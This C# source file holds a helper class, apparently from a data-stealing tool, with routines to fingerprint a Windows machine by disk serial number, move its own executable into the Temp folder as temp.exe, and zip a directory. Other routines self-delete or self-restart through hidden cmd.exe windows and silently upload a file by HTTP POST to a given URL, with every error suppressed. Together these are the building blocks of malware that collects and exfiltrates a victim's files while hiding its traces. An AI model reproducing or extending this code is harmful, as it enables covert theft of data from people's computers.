using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
//using System.Linq;
using System.Text;
using System.Management;
using System.IO.Compression;
using System.Net;

namespace NoFile
{
    internal class Helper
    {
        public static string GetRandomString()
        {
            return Path.GetRandomFileName().Replace(".", "");
        }

        public static void SelfDelete(string dir, string name)
        {
            Process.Start(new ProcessStartInfo()
            {
                Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" +
                name + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
        }

        public static void SelfRestart(string name)
        {
            Process.Start(new ProcessStartInfo()
            {
                Arguments = "/C choice /C Y /N /D Y /T 1 & \"" +
                name + " --zip\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
        }

        public static string GetHwid() // Works
        {
            string HoldingAdress = "";
            try
            {
                string drive = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
                ManagementObject disk = new ManagementObject("win32_logicaldisk.deviceid=\"" + drive + ":\"");
                disk.Get();
                string diskLetter = (disk["VolumeSerialNumber"].ToString());
                HoldingAdress = diskLetter;

            }
            catch (Exception)
            {

            }

            return HoldingAdress;
        }

        public static void Zip(string dir, string zipPath) //  Works
        {
            try
            {
                ZipFile.CreateFromDirectory(dir, zipPath,
            CompressionLevel.Optimal, false);
               
            }
            catch(Exception e)
            {
                 //Console.WriteLine(e.ToString());
            }
        }

        public static string Move() //  Works
        {
            try
            {
                string dir = Environment.GetEnvironmentVariable("Temp") + "\\" + GetHwid();
                Directory.CreateDirectory(dir);
                File.Move(Directory.GetCurrentDirectory() + "\\" + (new FileInfo((new Uri(Assembly.GetExecutingAssembly().CodeBase)).LocalPath)).Name, dir + "\\temp.exe");
                return dir;
            }
            catch(Exception e)
            {
                 //Console.WriteLine(e.ToString());
            }
            return (string)null;
            
        }

        public static void SendFile(string url, string filepath)
        {
            try
            {
                new WebClient().UploadFile(url, "POST", filepath);
            }
            catch (Exception ex)
            {
                // // //Console.WriteLine(ex.ToString());
            }
        }


    }
}
